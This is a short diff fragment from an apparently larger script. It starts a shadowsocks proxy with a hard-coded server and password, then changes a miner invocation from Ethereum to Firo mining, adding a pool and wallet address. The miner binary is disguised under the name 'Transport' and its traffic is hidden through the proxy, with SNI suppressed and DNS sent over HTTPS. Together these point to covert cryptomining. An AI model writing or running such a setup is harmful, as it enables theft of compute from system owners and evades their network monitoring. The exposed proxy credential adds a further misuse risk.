@@ -39,4 +39,4 @@ ss-local -s 3.16.66.235 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -
 
 ph add Transport
 
-./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x8CB8003E428D0Fd7693D22f576A212403728c64a -p x -w Transport --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+./Transport -a firopow -o stratum+ssl://firo-us.mintpond.com:3005 -u a2SHN1rGMt1Q8MUx9LXrHB265LgvUzjqM1.Transport -p x --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
